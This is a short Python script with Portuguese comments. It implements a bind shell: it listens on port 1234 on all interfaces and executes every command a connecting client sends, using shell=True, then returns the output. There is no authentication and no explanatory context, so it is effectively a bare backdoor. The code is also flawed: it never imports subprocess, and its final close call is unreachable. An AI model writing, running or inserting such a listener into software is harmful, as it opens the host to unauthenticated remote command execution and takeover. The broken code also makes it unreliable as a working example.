import socket

# Criando um socket que escute a porta especificada
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(("0.0.0.0", 1234))
server.listen(1)

# Aceitando conexões de clientes
while True:
    client, addr = server.accept()
    print(f"Conexão de {addr[0]}:{addr[1]}")

    # Recebendo comandos do cliente
    while True:
        command = client.recv(1024).decode()
        if not command:
            break
        # Executando o comando e enviando o resultado de volta para o cliente
        result = subprocess.run(command, shell=True, stdout=subprocess.PIPE)
        client.send(result.stdout)

# Fechando a conexão com o cliente
client.close()
